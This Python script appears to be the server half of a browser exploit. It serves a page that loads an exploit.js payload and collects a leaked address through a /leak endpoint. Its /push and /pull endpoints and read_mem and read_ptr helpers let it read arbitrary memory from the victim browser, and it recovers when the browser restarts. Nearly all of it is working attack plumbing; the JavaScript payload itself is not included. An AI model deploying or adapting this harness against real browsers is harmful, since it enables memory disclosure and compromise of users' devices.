import socketserver, socket, http.server, threading, queue

INDEX_HTML = b'''\
<html>
<body>
<script>
function print(){}
</script>
<script src="/exploit.js"></script>
<script src="/server.js"></script>
</body>
</html>
'''

in_q = queue.Queue()
out_q = queue.Queue()
leak_q = queue.Queue()

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def respond(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        try: self.wfile.write(data)
        except socket.error: pass
    def do_GET(self):
        if self.path == '/': ans = INDEX_HTML
        elif self.path == '/exploit.js': ans = open('..'+self.path, 'rb').read()
        elif self.path == '/server.js': ans = open('server.js', 'rb').read()
        else:
            self.send_error(404)
            return
        self.respond(ans)
    def do_POST(self):
        data = self.rfile.read(int(self.headers.get('Content-Length')))
        if self.path == '/leak':
            while True:
                try: out_q.get(timeout=0)
                except queue.Empty: break
            leak_q.put(data)
            in_q.put(None)
            self.respond(b'')
        elif self.path == '/push':
            in_q.put(bytes(map(int, data.split(b','))))
            self.respond(b'')
        elif self.path == '/pull':
            try: query = out_q.get(timeout=5)
            except queue.Empty: self.respond(b'null')
            else: self.respond(('{"offset": %d, "size": %d}'%tuple(query)).encode('ascii'))
        else:
            self.send_error(404)
    def log_request(self, *args): pass

class Server(socketserver.ThreadingMixIn, http.server.HTTPServer): pass

srv = Server(('', 8080), RequestHandler)
threading.Thread(target=srv.serve_forever, daemon=True).start()

class BrowserRestartedError(Exception): pass

def read_mem(offset, size):
    out_q.put((offset, size))
    ans = in_q.get()
    if ans is None:
        global tarea
        tarea = int(leak_q.get().decode('ascii'), 16)
        raise BrowserRestartedError()
    return ans

def read_ptr(offset):
    return int.from_bytes(read_mem(offset, 8), 'little')

tarea = int(leak_q.get().decode('ascii'), 16)
in_q.get()
